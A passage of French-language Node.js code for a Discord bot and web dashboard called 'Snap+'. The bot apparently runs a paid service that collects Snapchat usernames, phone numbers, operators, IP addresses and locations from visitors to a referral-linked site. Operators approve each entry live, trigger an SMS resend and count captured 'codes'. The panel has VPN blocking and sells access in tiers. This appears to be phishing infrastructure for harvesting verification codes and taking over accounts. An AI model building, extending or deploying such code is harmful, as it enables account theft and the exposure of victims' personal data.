                    .setDescription(list.map(ip => `\`${ip}\``).join('\n'))
                    .setTimestamp()
                ],
                ephemeral: true
            });
        }
    }

    // /clear — OWNER ONLY
    if (interaction.commandName === 'clear') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }
        const pending = [...requests.entries()].filter(([, r]) => !r.approved && !r.rejected);
        if (pending.length === 0) {
            return interaction.reply({ content: '✅ Aucune demande en attente.', ephemeral: true });
        }
        for (const [id, r] of pending) {
            r.rejected = true;
        }
        saveRequests(requests);
        // Mettre à jour le statut historique
        for (const entry of history) {
            if (pending.find(([id]) => id === entry.id)) entry.status = 'cleared';
        }
        saveHistory(history);
        return interaction.reply({
            content: `🗑️ **${pending.length} demande(s)** en attente vidées.`,
            ephemeral: true
        });
    }

    // /history — OWNER ONLY
    if (interaction.commandName === 'history') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }
        const last10 = history.slice(0, 10);
        if (last10.length === 0) {
            return interaction.reply({ content: '📭 Aucune demande dans l\'historique.', ephemeral: true });
        }
        const statusEmoji = { pending: '⏳', approved: '✅', rejected: '❌', cleared: '🗑️' };
        const lines = last10.map((e, i) => {
            const date = new Date(e.createdAt).toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
            const emoji = statusEmoji[e.status] || '❓';
            return `${emoji} **${e.snapchat}** | ${e.phone} | ${e.operator} | \`${date}\``;
        });
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('📋 10 dernières demandes')
                .setColor(0xFFFC00)
                .setDescription(lines.join('\n'))
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /config — OWNER ONLY
    if (interaction.commandName === 'config') {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
        }

        const sub = interaction.options.getSubcommand();

        // /config show
        if (sub === 'show') {
            const on  = '🟢 Activé';
            const off = '🔴 Désactivé';
            return interaction.reply({
                embeds: [new EmbedBuilder()
                    .setTitle('⚙️ Configuration actuelle')
                    .setColor(0xFFFC00)
                    .addFields(
                        { name: '🌐 Site actif',            value: cfg.site_actif          ? on : off,                    inline: true },
                        { name: '🔒 Rate limiting',         value: cfg.ratelimit_actif     ? `${on} (${cfg.ratelimit_minutes} min)` : off, inline: true },
                        { name: '🌍 Afficher IP',           value: cfg.afficher_ip         ? on : off,                    inline: true },
                        { name: '📱 Afficher appareil/OS',  value: cfg.afficher_appareil   ? on : off,                    inline: true },
                        { name: '👁️ Salon prioritaire',     value: cfg.salon_prioritaire   ? on : off,                    inline: true },
                        { name: '⏱️ Délai Discord',         value: `${cfg.delai_discord_sec}s`,                           inline: true },
                        { name: '⏰ Timeout demandes',      value: `${cfg.timeout_minutes} min`,                          inline: true },
                        { name: '🔗 Webhook fallback',      value: cfg.webhook_fallback    ? on : off,                    inline: true },
                        { name: '🛡️ Bloquer VPN',          value: cfg.bloquer_vpn         ? on : off,                    inline: true },
                    )
                    .setFooter({ text: 'Utilise /config set <parametre> <valeur> pour modifier' })
                    .setTimestamp()
                ],
                ephemeral: true
            });
        }

        // /config set
        if (sub === 'set') {
            const param = interaction.options.getString('parametre');
            const valStr = interaction.options.getString('valeur');

            const boolParams = ['site_actif','ratelimit_actif','afficher_ip','afficher_appareil','salon_prioritaire','webhook_fallback','bloquer_vpn'];
            const intParams  = { ratelimit_minutes: [1,60], timeout_minutes: [1,30], delai_discord_sec: [1,60] };

            if (boolParams.includes(param)) {
                if (!['true','false','1','0','oui','non'].includes(valStr.toLowerCase())) {
                    return interaction.reply({ content: `❌ Valeur invalide. Utilise \`true\` ou \`false\`.`, ephemeral: true });
                }
                cfg[param] = ['true','1','oui'].includes(valStr.toLowerCase());
                saveConfig(cfg);
                updateBotStatus();
                return interaction.reply({
                    content: `✅ **${param}** → \`${cfg[param] ? 'activé' : 'désactivé'}\``,
                    ephemeral: true
                });
            }

            if (intParams[param]) {
                const [min, max] = intParams[param];
                const val = parseInt(valStr);
                if (isNaN(val) || val < min || val > max) {
                    return interaction.reply({ content: `❌ Valeur invalide. Doit être entre ${min} et ${max}.`, ephemeral: true });
                }
                cfg[param] = val;
                saveConfig(cfg);
                return interaction.reply({
                    content: `✅ **${param}** → \`${val}\``,
                    ephemeral: true
                });
            }

            return interaction.reply({ content: `❌ Paramètre inconnu : \`${param}\``, ephemeral: true });
        }

        // /config reset
        if (sub === 'reset') {
            cfg = { ...CONFIG_DEFAULTS };
            saveConfig(cfg);
            updateBotStatus();
            return interaction.reply({ content: '♻️ Configuration réinitialisée aux valeurs par défaut.', ephemeral: true });
        }
    }
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const requestId = parts.slice(1).join('_');

    if (!['approve', 'reject', 'resend'].includes(action)) return;

    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable ou expirée.', ephemeral: true });

    if (action === 'resend') {
        request.resend = true;
        saveRequests(requests);
        return interaction.reply({ content: `📲 Signal "Renvoyer SMS" envoyé à ${request.snapchat}.`, ephemeral: true });
    }

    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }

    if (action === 'approve') {
        request.approved = true;
        saveRequests(requests);
        incStat('approved');
        updateBotStatus();
        io.emit('request_update', { id: requestId, status: 'approved', snapchat: request.snapchat });
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });

        // DM owner si activé
        if (cfg.dm_notifs !== false) {
            try {
                const owner = await client.users.fetch(OWNER_ID);
                await owner.send({ embeds: [new EmbedBuilder()
                    .setTitle('✅ Demande acceptée')
                    .setColor(0x00FF6A)
                    .addFields(
                        { name: '👻 Snap', value: request.snapchat, inline: true },
                        { name: '📱 Téléphone', value: request.phone || '?', inline: true },
                        { name: '🌍 Localisation', value: request.geo || '?', inline: false }
                    )
                    .setFooter({ text: `ID: ${requestId}` })
                    .setTimestamp()
                ]});
            } catch(e) {}
        }
    } else {
        request.rejected = true;
        saveRequests(requests);
        incStat('rejected');
        updateBotStatus();
        io.emit('request_update', { id: requestId, status: 'rejected', snapchat: request.snapchat });
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
        // DM owner si activé
        if (cfg.dm_notifs !== false) {
            try {
                const owner = await client.users.fetch(OWNER_ID);
                await owner.send({ embeds: [new EmbedBuilder()
                    .setTitle('❌ Demande refusée')
                    .setColor(0xFF4444)
                    .addFields(
                        { name: '👻 Snap', value: request.snapchat, inline: true },
                        { name: '📱 Téléphone', value: request.phone || '?', inline: true }
                    )
                    .setFooter({ text: `ID: ${requestId}` })
                    .setTimestamp()
                ]});
            } catch(e) {}
        }
    }

    // Désactiver les boutons du message
    try {
        const disabledRow = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${requestId}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success).setDisabled(true),
                new ButtonBuilder().setCustomId(`reject_${requestId}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger).setDisabled(true),
                new ButtonBuilder().setCustomId(`resend_${requestId}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary).setDisabled(true)
            );
        await interaction.message.edit({ components: [disabledRow] });
    } catch (e) {
        console.error('Erreur désactivation boutons:', e.message);
    }
});

// ================== DISCORD OAUTH2 ==================

// Redirige vers Discord OAuth2
app.get('/login', (req, res) => {
    if (!DISCORD_CLIENT_ID) {
        return res.status(503).send('<h2>DISCORD_CLIENT_ID manquant dans .env</h2>');
    }
    const params = new URLSearchParams({
        client_id:     DISCORD_CLIENT_ID,
        redirect_uri:  `${BASE_URL}/auth/callback`,
        response_type: 'code',
        scope:         'identify'
    });
    res.redirect(`https://discord.com/api/oauth2/authorize?${params}`);
});

// Callback après autorisation Discord
app.get('/auth/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.redirect('/login');
    if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET) {
        return res.status(503).send('<h2>OAuth2 non configuré (DISCORD_CLIENT_ID / DISCORD_CLIENT_SECRET manquants)</h2>');
    }
    try {
        const tokenRes = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id:     DISCORD_CLIENT_ID,
                client_secret: DISCORD_CLIENT_SECRET,
                grant_type:    'authorization_code',
                code,
                redirect_uri:  `${BASE_URL}/auth/callback`
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${tokenRes.data.access_token}` }
        });
        req.session.user = {
            id:            userRes.data.id,
            username:      userRes.data.username,
            avatar:        userRes.data.avatar,
            discriminator: userRes.data.discriminator || '0'
        };
        res.redirect('/dashboard');
    } catch (e) {
        console.error('OAuth error:', e.response?.data || e.message);
        res.redirect('/login?error=1');
    }
});

// Déconnexion
app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/'));
});

// Dashboard (page HTML protégée)
app.get('/dashboard', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ================== API DASHBOARD ==================

// Profil utilisateur connecté
app.get('/api/me', requireAuth, (req, res) => {
    const u = req.session.user;
    const avatarUrl = u.avatar
        ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png`
        : `https://cdn.discordapp.com/embed/avatars/${parseInt(u.discriminator || '0') % 5}.png`;
    const clientId = DISCORD_CLIENT_ID || (client.user ? client.user.id : null);
    const inviteLink = clientId
        ? `https://discord.com/api/oauth2/authorize?client_id=${clientId}&permissions=2147609600&scope=bot%20applications.commands`
        : null;
    res.json({
        id:         u.id,
        username:   u.username,
        avatarUrl,
        isPremium:  hasSubscription(u.id),
        isBotTier:  hasBotAccess(u.id) && !hasSubscription(u.id) && !isOwner(u.id),
        isOwner:    isOwner(u.id),
        subType:    getSubType(u.id),
        inviteLink,
    });
});

// Config publique du site (utilisée par index.html pour personnaliser les textes)
app.get('/api/site-config', (req, res) => {
    const keys = [
        'site_titre','site_sous_titre','site_description',
        'site_stat_actif','site_badge','site_btn_text',
        'site_attente_titre','site_attente_texte',
        'site_code_titre','site_code_desc','site_succes_msg'
    ];
    const out = {};
    for (const k of keys) out[k] = cfg[k] ?? CONFIG_DEFAULTS[k];
    res.json(out);
});

// Config complète (premium)
app.get('/api/dashboard/config', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    res.json(cfg);
});

app.post('/api/dashboard/config', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    const defaults = CONFIG_DEFAULTS;
    for (const key of Object.keys(defaults)) {
        if (!(key in req.body)) continue;
        const raw = req.body[key];
        if (typeof defaults[key] === 'boolean') cfg[key] = raw === true || raw === 'true' || raw === 1 || raw === '1';
        else if (typeof defaults[key] === 'number')  cfg[key] = parseFloat(raw) || defaults[key];
        else cfg[key] = String(raw);
    }
    saveConfig(cfg);
    updateBotStatus();
    res.json({ ok: true, cfg });
});

// Stats (premium)
app.get('/api/dashboard/stats', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    resetStatsIfNewDay();
    const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
    res.json({ ...statsToday, pending, history: history.slice(0, 20), statsTotal });
});

// Stats client (bot tier) — stats filtrées par guild
app.get('/api/client/stats', requireAuth, (req, res) => {
    const uid = req.session.user.id;
    if (!hasBotAccess(uid)) return res.status(403).json({ error: 'bot_required' });
    // Trouver le guild de ce client
    const guildId = Object.entries(cfg.guild_premiums || {}).find(([, v]) => v && v.discordId === uid)?.[0]
        || Object.entries(cfg.guild_owners || {}).find(([, v]) => v === uid)?.[0];
    resetStatsIfNewDay();
    const clientHistory = guildId
        ? history.filter(h => h.refGuildId === guildId)
        : [];
    const approved = clientHistory.filter(h => h.status === 'approved').length;
    const rejected = clientHistory.filter(h => h.status === 'rejected').length;
    const total    = clientHistory.length;
    // 7 jours
    const daily7 = [];
    for (let i = 6; i >= 0; i--) {
        const d = new Date(); d.setDate(d.getDate() - i); d.setHours(0,0,0,0);
        const label = d.toLocaleDateString('fr-FR', { weekday:'short', day:'numeric' });
        const start = d.getTime(); const end = start + 86400000;
        daily7.push({ label, count: clientHistory.filter(h => h.createdAt >= start && h.createdAt < end).length });
    }
    res.json({ total, approved, rejected, daily7, guildId });
});

// Demandes en attente (premium)
app.get('/api/dashboard/requests', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    const list = [...requests.entries()]
        .filter(([, r]) => !r.approved && !r.rejected)
        .map(([id, r]) => ({ id, ...r }))
        .sort((a, b) => b.createdAt - a.createdAt);
    res.json(list);
});

// Blacklist (premium)
app.get('/api/dashboard/blacklist', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    res.json([...blacklist]);
});
app.post('/api/dashboard/blacklist/add', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    const { ip } = req.body;
    if (!ip) return res.status(400).json({ error: 'IP manquante' });
    blacklist.add(ip.trim()); saveBlacklist(blacklist);
    res.json({ ok: true });
});
app.post('/api/dashboard/blacklist/remove', requireAuth, (req, res) => {
    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    const { ip } = req.body;
    blacklist.delete(ip); saveBlacklist(blacklist);
    res.json({ ok: true });
});

// Détail d'un serveur (owner only)
app.get('/api/dashboard/guilds/:id', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    if (!botReady) return res.status(503).json({ error: 'bot_not_ready' });
    const guild = client.guilds.cache.get(req.params.id);
    if (!guild) return res.status(404).json({ error: 'Serveur introuvable' });

    const channels = [...guild.channels.cache.values()]
        .map(c => ({ id: c.id, name: c.name, type: c.type, position: c.rawPosition, parentId: c.parentId || null }))
        .sort((a, b) => a.position - b.position);

    res.json({
        id: guild.id, name: guild.name,
        icon: guild.iconURL({ size: 128 }) || null,
        memberCount: guild.memberCount,
        ownerId: guild.ownerId,
        ownerSub: getSubType(guild.ownerId),
        hasPremium: hasGuildPremium(guild.id),
        channelId: (cfg.guild_channels && cfg.guild_channels[guild.id]) || null,
        refLink: (cfg.guild_channels && cfg.guild_channels[guild.id]) ? `${BASE_URL}?ref=${guild.id}` : null,
        createdAt: guild.createdTimestamp,
        channels
    });
});

// Grant / revoke premium sur un serveur (owner only)
app.post('/api/dashboard/guilds/:id/premium', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const guildId = req.params.id;
    const { grant } = req.body;
    if (!cfg.guild_premiums) cfg.guild_premiums = {};
    if (grant) {
        cfg.guild_premiums[guildId] = { grantedAt: Date.now(), tier: grant };
    } else {
        delete cfg.guild_premiums[guildId];
    }
    saveConfig(cfg);
    saveGuildChannels().catch(() => {}); // persiste guild_premiums sur Render
    // Mettre à jour les commandes visibles dans ce guild
    if (client._registerGuildCommands) client._registerGuildCommands(guildId).catch(() => {});
    res.json({ ok: true, hasPremium: !!cfg.guild_premiums[guildId] });
});

// Set/get channel pour un guild (owner only via dashboard)
app.post('/api/dashboard/guilds/:id/channel', requireAuth, async (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const guildId = req.params.id;
    const { channelId } = req.body;
    if (!cfg.guild_channels) cfg.guild_channels = {};
    if (channelId) {
        cfg.guild_channels[guildId] = channelId;
    } else {
        delete cfg.guild_channels[guildId];
    }
    await saveGuildChannels();
    res.json({ ok: true, link: channelId ? `${BASE_URL}?ref=${guildId}` : null, envJson: JSON.stringify(cfg.guild_channels) });
});

// Analytics (owner only)
app.get('/api/dashboard/analytics', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const now = Date.now();
    const last24h = now - 24 * 60 * 60 * 1000;

    const hourly = new Array(24).fill(0);
    const countries = {};
    let approved = 0, rejected = 0, pending = 0;

    for (const r of requests.values()) {
        if (r.createdAt > last24h) {
            const h = new Date(r.createdAt).getHours();
            hourly[h]++;
        }
        if (r.approved) approved++;
        else if (r.rejected) rejected++;
        else pending++;

        // geo format: "🇫🇷 Paris, France" → on prend le dernier segment
        if (r.geo && r.geo !== '?') {
            const parts = r.geo.split(', ');
            const country = parts[parts.length - 1];
            countries[country] = (countries[country] || 0) + 1;
        }
    }

    const topCountries = Object.entries(countries)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 8);

    // 7 derniers jours depuis l'historique
    const daily7 = [];
    for (let i = 6; i >= 0; i--) {
        const d = new Date(); d.setDate(d.getDate() - i); d.setHours(0,0,0,0);
        const label = d.toLocaleDateString('fr-FR', { weekday:'short', day:'numeric', month:'numeric' });
        const start = d.getTime(); const end = start + 86400000;
        const count = history.filter(h => h.createdAt >= start && h.createdAt < end).length;
        daily7.push({ label, count });
    }

    resetStatsIfNewDay();
    res.json({ hourly, topCountries, totals: { approved, rejected, pending, total: requests.size }, statsToday, statsTotal, daily7 });
});

// ================== STRIPE ==================

// Créer une session de paiement Stripe Checkout
app.post('/api/create-checkout', requireAuth, async (req, res) => {
    if (!stripe) return res.status(503).json({ error: 'Stripe non configuré. Ajoute STRIPE_SECRET_KEY dans .env et lance : npm install stripe' });
    if (!process.env.STRIPE_PRICE_ID) return res.status(503).json({ error: 'STRIPE_PRICE_ID manquant dans .env' });
    const u = req.session.user;
    try {
        const sess = await stripe.checkout.sessions.create({
            payment_method_types: ['card'],
            mode:         'subscription',
            line_items:   [{ price: process.env.STRIPE_PRICE_ID, quantity: 1 }],
            success_url:  `${BASE_URL}/dashboard?success=1`,
            cancel_url:   `${BASE_URL}/dashboard?cancelled=1`,
            metadata:     { discordId: u.id, discordUsername: u.username },
            locale:       'fr'
        });
        res.json({ url: sess.url });
    } catch (e) {
        console.error('Stripe checkout error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

// Webhook Stripe (events de paiement/annulation)
app.post('/api/stripe/webhook', (req, res) => {
    if (!stripe) return res.sendStatus(200);
    const sig = req.headers['stripe-signature'];
    if (!process.env.STRIPE_WEBHOOK_SECRET) {
        console.warn('STRIPE_WEBHOOK_SECRET manquant — webhook non vérifié');
        return res.sendStatus(200);
    }
    let event;
    try {
        event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);
    } catch (e) {
        console.error('Stripe webhook signature error:', e.message);
        return res.status(400).send(`Webhook Error: ${e.message}`);
    }

    if (event.type === 'checkout.session.completed') {
        const sess     = event.data.object;
        const discordId = sess.metadata?.discordId;
        if (discordId) {
            subs[discordId] = {
                active:           true,
                stripeCustomerId: sess.customer,
                stripeSubId:      sess.subscription,
                startedAt:        Date.now()
            };
            saveSubs(subs);
            console.log(`✅ Premium activé — Discord: ${discordId}`);
        }
    }

    if (event.type === 'customer.subscription.deleted' || event.type === 'customer.subscription.paused') {
        const sub   = event.data.object;
        const entry = Object.entries(subs).find(([, v]) => v.stripeCustomerId === sub.customer);
        if (entry) {
            subs[entry[0]].active = false;
            saveSubs(subs);
            console.log(`❌ Premium désactivé — Discord: ${entry[0]}`);
        }
    }

    res.sendStatus(200);
});

// ================== SERVEURS DISCORD ==================
app.get('/api/dashboard/guilds', requireAuth, (req, res) => {
    if (!hasBotAccess(req.session.user.id) && !isOwner(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
    if (!botReady) return res.json([]);
    const userId = req.session.user.id;
    const guilds = [...client.guilds.cache.values()]
        .filter(g => {
            // Owner voit tout, les clients voient seulement leur serveur
            if (isOwner(userId)) return true;
            return cfg.guild_owners && cfg.guild_owners[g.id] === userId;
        })
        .map(g => ({
            id: g.id,
            name: g.name,
            memberCount: g.memberCount,
            icon: g.iconURL({ size: 64 }) || null,
            premium: hasGuildPremium(g.id),
            channelId: (cfg.guild_channels || {})[g.id] || null,
            refLink: (cfg.guild_channels || {})[g.id] ? `${BASE_URL}?ref=${g.id}` : null,
            disabled: (cfg.disabled_guilds || []).includes(g.id),
            configuredBy: (cfg.guild_owners || {})[g.id] || null,
            isNew: (cfg.guild_notifications || []).some(n => n.guildId === g.id && !n.seen)
        }));
    res.json(guilds);
});

// Notifications de nouveaux serveurs (owner only)
app.get('/api/dashboard/notifications', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    res.json(cfg.guild_notifications || []);
});

// Marquer les notifications comme vues (owner only)
app.post('/api/dashboard/notifications/seen', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    if (cfg.guild_notifications) cfg.guild_notifications.forEach(n => n.seen = true);
    saveConfig(cfg);
    res.json({ ok: true });
});

// Activer / désactiver un serveur (owner only)
app.post('/api/dashboard/guilds/:id/toggle', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const guildId = req.params.id;
    if (!cfg.disabled_guilds) cfg.disabled_guilds = [];
    const idx = cfg.disabled_guilds.indexOf(guildId);
    if (idx === -1) {
        cfg.disabled_guilds.push(guildId);
    } else {
        cfg.disabled_guilds.splice(idx, 1);
    }
    saveConfig(cfg);
    saveGuildChannels().catch(() => {}); // persiste disabled_guilds sur Render
    res.json({ ok: true, disabled: cfg.disabled_guilds.includes(guildId) });
});

// Créer un lien d'invitation pour rejoindre un serveur (owner only)
app.post('/api/dashboard/guilds/:id/invite', requireAuth, async (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const guild = client.guilds.cache.get(req.params.id);
    if (!guild) return res.status(404).json({ error: 'guild_not_found' });
    try {
        const channel = guild.channels.cache.find(c => c.type === 0 && c.permissionsFor(guild.members.me)?.has('CreateInstantInvite'));
        if (!channel) return res.status(400).json({ error: 'no_channel' });
        const invite = await channel.createInvite({ maxAge: 300, maxUses: 1, unique: true, reason: 'Owner dashboard access' });
        res.json({ url: invite.url });
    } catch(e) {
        console.error('[INVITE]', e.message);
        res.status(500).json({ error: e.message });
    }
});

// ================== CODES PROMO ==================
// Générer un code (owner only)
app.post('/api/generate-promo', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    const { maxUses = 1, durationDays = 30 } = req.body;
    const code = 'SNAP-' + Math.random().toString(36).slice(2, 8).toUpperCase();
    promos[code] = {
        code,
        createdAt: Date.now(),
        maxUses: parseInt(maxUses) || 1,
        durationDays: parseInt(durationDays) || 30,
        usedBy: []
    };
    savePromos(promos);
    res.json({ ok: true, code });
});

// Lister les codes (owner only)
app.get('/api/dashboard/promos', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    res.json(Object.values(promos));
});

// Supprimer un code (owner only)
app.delete('/api/dashboard/promos/:code', requireAuth, (req, res) => {
    if (!isOwner(req.session.user.id)) return res.status(403).json({ error: 'owner_only' });
    delete promos[req.params.code];
    savePromos(promos);
    res.json({ ok: true });
});

// Utiliser un code promo
app.post('/api/redeem-promo', requireAuth, (req, res) => {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'Code manquant' });
    const promo = promos[code.trim().toUpperCase()];
    if (!promo) return res.status(400).json({ error: 'Code invalide ou inexistant.' });
    if (promo.usedBy.length >= promo.maxUses) return res.status(400).json({ error: 'Ce code a déjà été utilisé le nombre maximum de fois.' });
    const userId = req.session.user.id;
    if (promo.usedBy.includes(userId)) return res.status(400).json({ error: 'Tu as déjà utilisé ce code.' });

    promo.usedBy.push(userId);
    savePromos(promos);

    const durationMs = promo.durationMs || (promo.durationDays * 24 * 60 * 60 * 1000);
    const expiresAt = Date.now() + durationMs;
    const durationHours = Math.round(durationMs / (60 * 60 * 1000));
    const durationDays = durationMs / (24 * 60 * 60 * 1000);
    const durationLabel = durationDays >= 36500 ? 'à vie'
        : durationHours < 24 ? `${durationHours}h`
        : `${Math.round(durationDays)} jour${Math.round(durationDays) > 1 ? 's' : ''}`;
    subs[userId] = { active: true, startedAt: Date.now(), expiresAt, promoCode: code, tier: promo.tier || 'premium' };
    saveSubs(subs);

    // Met à jour la session
    req.session.user._premiumRefresh = Date.now();

    res.json({ ok: true, expiresAt, durationDays, durationLabel, tier: promo.tier || 'premium' });
});

// Page 404 custom
app.use((req, res) => {
    res.status(404).send(`<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3;url=/">
  <title>Page introuvable</title>
  <style>
    body { background:#000; color:#fff; font-family:sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; }
    h1 { font-size:60px; color:#FFFC00; margin:0; }
    p { color:#888; margin-top:12px; }
  </style>
</head>
<body>
  <h1>404</h1>
  <p>Page introuvable — redirection en cours...</p>
</body>
</html>`);
});

// ================== STATUS EMBED LIVE ==================
async function updateStatusEmbed() {
    if (!botReady || !cfg.status_channel_id) return;
    try {
        const channel = client.channels.cache.get(cfg.status_channel_id);
        if (!channel) return;

        resetStatsIfNewDay();
        const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
        const ping    = client.ws.ping;

        // Contrôle du bot : toujours géré par l'owner via le dashboard
        const guild = client.guilds.cache.get(channel.guildId);
        let subInfo = '👑 Owner';
        if (guild && hasGuildPremium(guild.id)) subInfo = '💎 Premium accordé';

        const embed = new EmbedBuilder()
            .setTitle('📡 Status — Live')
            .setColor(cfg.site_actif ? 0x00FF6A : 0xFF4444)
            .addFields(
                { name: '🌐 Site',         value: cfg.site_actif ? '🟢 Actif' : '🔴 Désactivé',  inline: true },
                { name: '🤖 Bot',          value: `🟢 En ligne (${ping > 0 ? ping : '~'}ms)`,    inline: true },
                { name: '💎 Abonnement',   value: subInfo,                                         inline: true },
                { name: '📊 Stats du jour', value: [
                    `📥 Demandes : **${statsToday.total}**`,
                    `✅ Acceptées : **${statsToday.approved}**`,
                    `❌ Refusées  : **${statsToday.rejected}**`,
                    `🔐 Codes     : **${statsToday.codes}**`,
                    `⏳ En attente : **${pending}**`,
                ].join('\n'), inline: false },
            )
            .setFooter({ text: 'Mise à jour automatique toutes les 60s' })
            .setTimestamp();

        // Essaie d'éditer le message existant
        if (cfg.status_message_id) {
            try {
                const msg = await channel.messages.fetch(cfg.status_message_id);
                await msg.edit({ embeds: [embed] });
                return;
            } catch(e) {
                // Message supprimé — on en crée un nouveau
                cfg.status_message_id = '';
            }
        }

        // Nouveau message
        const msg = await channel.send({ embeds: [embed] });
        cfg.status_message_id = msg.id;
        saveConfig(cfg);
        console.log(`📡 Status embed posté dans #${channel.name}`);
    } catch(e) {
        console.error('Erreur status embed:', e.message);
    }
}

// --- Démarrage ---
client.once('ready', async () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);

    // Sync MongoDB avant tout le reste
    await syncFromMongoDB();

    botReady = true;

    // Enregistrer les slash commands
    try {
        const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);

        const configParams = [
            'site_actif','ratelimit_actif','afficher_ip','afficher_appareil',
            'salon_prioritaire','webhook_fallback',
            'ratelimit_minutes','timeout_minutes','delai_discord_sec'
        ];

        // ── Commandes publiques (tous les serveurs) ──────────────────────
        const publicCmds = [
                new SlashCommandBuilder()
                    .setName('forfaits')
                    .setDescription('💰 Voir les forfaits et tarifs disponibles')
                    .toJSON(),
                new SlashCommandBuilder()
                    .setName('install')
                    .setDescription('🚀 Guide d\'installation — ajouter le bot sur un nouveau serveur')
                    .toJSON(),
                new SlashCommandBuilder()
                    .setName('abonnement')
                    .setDescription('💎 Voir le statut de ton abonnement')
                    .toJSON(),
                new SlashCommandBuilder()
                    .setName('guide')
                    .setDescription('📖 Guide complet — comment utiliser le bot Snap+')
                    .toJSON(),
        ];

        // ── Commandes Bot tier (accès bot ou premium) ────────────────────
        const botCmds = [
                ...publicCmds,
                new SlashCommandBuilder()
                    .setName('setchannel')
                    .setDescription('📥 Définir ce salon comme récepteur des demandes Snap+')
                    .toJSON(),
                new SlashCommandBuilder()
                    .setName('infodash')
                    .setDescription('📊 Présenter le dashboard de gestion dans ce salon')
                    .toJSON(),
                new SlashCommandBuilder()
                    .setName('stats')
                    .setDescription('📊 Voir les stats du jour [PREMIUM]')
                    .toJSON(),
        ];

        // ── Commandes Owner (serveurs de l'owner uniquement) ─────────────
        const ownerCmds = [
                ...botCmds,
                new SlashCommandBuilder()
                    .setName('dashboard')
                    .setDescription('🖥️ Accéder au dashboard web [OWNER ONLY]')
                    .toJSON(),
                new SlashCommandBuilder()
                    .setName('setstatus')
                    .setDescription('📡 Configurer le canal de status live dans ce salon [OWNER ONLY]')
                    .toJSON(),
                new SlashCommandBuilder()
                    .setName('genpromo')
                    .setDescription('🎟️ Générer un code promo [OWNER ONLY]')
                    .addStringOption(o => o.setName('tier').setDescription('Type d\'accès').setRequired(true)
                        .addChoices({ name: '🤖 Bot (3€) — /setchannel + demandes Discord', value: 'bot' }, { name: '💎 Premium (6€) — Bot + dashboard complet', value: 'premium' }))
                    .addIntegerOption(o => o.setName('heures').setDescription('Durée en heures (ex: 24)').setRequired(true).setMinValue(1).setMaxValue(8760))
